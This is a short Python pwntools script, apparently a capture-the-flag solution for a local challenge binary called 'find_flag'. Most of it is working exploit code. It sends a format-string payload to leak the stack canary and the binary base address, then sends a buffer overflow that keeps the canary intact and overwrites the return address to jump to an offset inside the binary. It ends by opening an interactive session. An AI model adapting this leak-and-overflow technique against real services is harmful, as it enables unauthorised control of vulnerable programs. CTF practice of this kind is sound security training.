#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./find_flag')
    elf = ELF('./find_flag')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

#gdb.attach(p)

# fmtstr
payload = b'%17$p:%19$p'
p.sendlineafter(b'name? ', payload)
p.recvuntil(b'Nice to meet you, 0x')
canary = int(p.recv(16), 16)
info('canary = ' + hex(canary))
p.recvuntil(b':0x')
binary_base = int(p.recv(12), 16) - 0x146f
info('banary_base = ' + hex(binary_base))

# rop
payload = 56 * b'B' + p64(canary) + p64(0xdeadbeef) + p64(binary_base + 0x1228)
p.sendlineafter(b'else? ', payload)

p.interactive()

